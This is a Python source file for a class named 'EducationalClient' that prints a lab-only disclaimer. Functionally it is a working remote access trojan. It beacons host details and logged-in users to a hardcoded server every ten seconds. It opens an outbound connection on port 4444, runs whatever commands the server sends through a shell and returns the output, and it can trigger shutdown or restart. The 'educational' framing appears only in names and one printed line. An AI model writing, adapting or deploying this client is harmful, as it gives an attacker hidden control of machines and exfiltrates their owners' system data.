import socket
import platform
import subprocess
import json
import time
from datetime import datetime
import threading
import requests

class EducationalClient:
    def __init__(self):
        self.config = {
            "server_ip": "192.168.1.100",  # LAB SERVER IP
            "command_port": 4444,
            "data_port": 8000,
            "session_id": f"EDU-{platform.node()}-{int(time.time())}",
            "poll_interval": 10
        }
        
    def get_system_info(self):
        return {
            "session_id": self.config['session_id'],
            "timestamp": str(datetime.now()),
            "os": platform.system(),
            "hostname": platform.node(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "cpu": platform.processor(),
            "memory": self.get_memory_info(),
            "users": self.get_logged_in_users()
        }

    def get_memory_info(self):
        try:
            if platform.system() == "Windows":
                return subprocess.check_output("wmic memorychip get capacity", shell=True).decode()
            else:
                return subprocess.check_output("free -h", shell=True).decode()
        except:
            return "N/A"

    def get_logged_in_users(self):
        try:
            if platform.system() == "Windows":
                return subprocess.check_output("query user", shell=True).decode()
            else:
                return subprocess.check_output("who", shell=True).decode()
        except:
            return "N/A"

    def send_system_data(self):
        while True:
            try:
                data = self.get_system_info()
                requests.post(
                    f"http://{self.config['server_ip']}:{self.config['data_port']}/api/data",
                    json=data,
                    timeout=5
                )
            except Exception as e:
                pass
            time.sleep(self.config['poll_interval'])

    def start(self):
        print(f"[*] Educational Client Started - Session ID: {self.config['session_id']}")
        print("[!] FOR LAB USE ONLY - DO NOT DEPLOY IN PRODUCTION")
        
        # Start data collection thread
        data_thread = threading.Thread(target=self.send_system_data, daemon=True)
        data_thread.start()
        
        # Main command loop
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.config['server_ip'], self.config['command_port']))
                    while True:
                        command = s.recv(1024).decode().strip()
                        if command.lower() in ["exit", "quit"]:
                            break
                        output = self.execute_command(command)
                        s.sendall(output.encode())
            except:
                time.sleep(5)

    def execute_command(self, cmd):
        try:
            if cmd.lower() == "shutdown":
                return self.safe_shutdown()
            elif cmd.lower() == "restart":
                return self.safe_restart()
            
            result = subprocess.check_output(
                cmd, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return result.decode()
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except subprocess.CalledProcessError as e:
            return e.output.decode()
        except Exception as e:
            return str(e)

    def safe_shutdown(self):
        if platform.system() == "Windows":
            subprocess.run(["shutdown", "/s", "/t", "10"])
        else:
            subprocess.run(["shutdown", "-h", "+1"])
        return "Shutdown scheduled in 1 minute"

    def safe_restart(self):
        if platform.system() == "Windows":
            subprocess.run(["shutdown", "/r", "/t", "10"])
        else:
            subprocess.run(["shutdown", "-r", "+1"])
        return "Restart scheduled in 1 minute"

if __name__ == "__main__":
    client = EducationalClient()
    client.start()
